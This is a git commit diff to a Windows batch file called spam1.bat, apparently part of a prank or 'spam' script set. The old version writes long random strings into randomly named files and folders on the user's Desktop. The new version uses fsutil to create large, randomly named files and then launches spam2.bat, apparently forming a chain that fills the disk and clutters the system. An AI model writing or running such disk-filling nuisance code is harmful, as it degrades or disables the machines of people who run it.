5964a911ef069e07b70b64b44b412b019fed99e7
Cox-school <85566656+Cox-school@users.noreply.github.com>
2021-06-30 12:40:54 +0100

    Update spam1.bat

--- spam1.bat
+++ spam1.bat
@@ -1,5 +1,3 @@
-echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %USERPROFILE%\Desktop\%random%.txt
+fsutil file createnew %random% %random%00000
 start spam2.bat
-fsutil file createnew %random% %random%0000
-MD %USERPROFILE%\Desktop\%random%
 exit
